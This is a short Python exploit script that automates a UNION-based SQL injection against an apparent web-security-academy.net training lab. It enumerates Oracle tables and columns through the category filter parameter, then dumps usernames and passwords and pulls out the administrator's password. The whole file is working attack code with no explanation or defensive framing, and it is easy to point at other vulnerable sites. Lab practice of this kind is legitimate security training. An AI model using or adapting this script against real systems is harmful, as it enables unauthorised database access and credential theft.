import requests
import re
from bs4 import BeautifulSoup

url = "https://0a10001704a5676d8011084c007e009a.web-security-academy.net"

def get_html(payload):
    target = f"{url}/filter?category={payload}"
    r = requests.get(target)
    return r.text

def run_exploit():
    print(f"Target: {url}")

    payload_table = "Gifts' UNION SELECT table_name,NULL FROM all_tables--"
    html_table = get_html(payload_table)
    
    tables = re.findall(r'USERS_[A-Z0-9]+', html_table)
    unique_tables = list(set(tables))
    
    print(f"Potential tables found: {unique_tables}")

    correct_table = None
    user_col = None
    pass_col = None

    for t in unique_tables:
        print(f"Checking table: {t}")
        payload_columns = f"Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='{t}'--"
        html_columns = get_html(payload_columns)
        
        user_col_match = re.search(r'USERNAME_[A-Z0-9]+', html_columns)
        pass_col_match = re.search(r'PASSWORD_[A-Z0-9]+', html_columns)
        
        if user_col_match and pass_col_match:
            correct_table = t
            user_col = user_col_match.group(0)
            pass_col = pass_col_match.group(0)
            break
            
    if not correct_table:
        print("Columns failed on all candidates.")
        return

    print(f"Valid Table: {correct_table}")
    print(f"Columns: {user_col}, {pass_col}")

    payload_data = f"Gifts' UNION SELECT {user_col},{pass_col} FROM {correct_table}--"
    html_data = get_html(payload_data)
    
    soup = BeautifulSoup(html_data, 'html.parser')
    text_content = soup.get_text()
    
    creds = re.search(r'administrator\s+([a-z0-9]{20})', text_content)
    
    if creds:
        print(f"Password: {creds.group(1)}")
    else:
        print("Auto-regex failed. Raw candidates (check manually):")
        print(re.findall(r'[a-z0-9]{20}', text_content))

if __name__ == "__main__":
    run_exploit()